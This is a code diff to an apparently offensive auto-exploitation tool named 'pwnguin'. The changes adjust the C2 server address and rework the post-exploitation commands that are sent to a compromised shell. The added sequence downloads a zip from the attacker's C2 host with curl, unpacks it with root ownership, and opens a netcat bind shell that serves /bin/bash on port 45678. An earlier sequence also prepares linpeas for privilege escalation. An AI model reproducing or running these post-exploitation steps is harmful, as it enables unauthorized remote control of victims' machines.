@@ -38,7 +38,7 @@ LOG("Launched autopwn.", logfile, "inf")
 IP = "192.168.1.45"
 EXPLOIT_LIST = "./exploit_list"
 
-debug = 0
+debug = 1
 
 
 def show_pwnguin():
@@ -355,8 +355,8 @@ def autopwn(
         LOG("Entered in C&C section", logfile, "inf")
 
         print("[~] Opening local C2 server ...")
-        (proc, port) = postexploit.openCtrlSrv("192.168.1.86")
-        ipport = "http://192.168.1.86:" + str(port)
+        (proc, port) = postexploit.openCtrlSrv("192.168.1.45")
+        ipport = "http://192.168.1.45:" + str(port)
     else:
         ipport = "0.0.0.0:0"  # Do not use ip/port if there is no command and control
     print("[V] Pwn complete !!! ")
@@ -366,6 +366,7 @@ def autopwn(
 if __name__ == "__main__":
 
     # showEdbExploit("./edb/2444.sh")
+    #showEdbExploit("./edb/2444.sh")
 
     if debug == 1:
         print("**** RUNNING IN DEBUG MODE ****")
@@ -387,16 +388,22 @@ if __name__ == "__main__":
         "echo 0xcafedeadbeef",
         "chmod +x linpeas.sh",
         "echo matthislemechan",
-        "nc -l -p 45678 -e /bin/bash",
     ]
     sequence2 = [
-        "git clone https://github.com/kiso6/pwnguin",
+    	"cd /root",
+    	"pwd",
+    	"ls",
+        "curl -s " + srv + "/post/main.zip -o main.zip > /dev/null",
+        "unzip main.zip",
         "chown root:root pwnguin",
         "cd pwnguin",
         "chmod -R 700 .",
+        "echo pwnguined",
+        "nc -l -p 45678 -e /bin/bash",
     ]
     sendCommands(shell, sequence)
-
+    sendCommands(shell, sequence2)
+    
     LOG("END OF LOGS", logfile, "crit")
     logfile.close()
     exit(0)
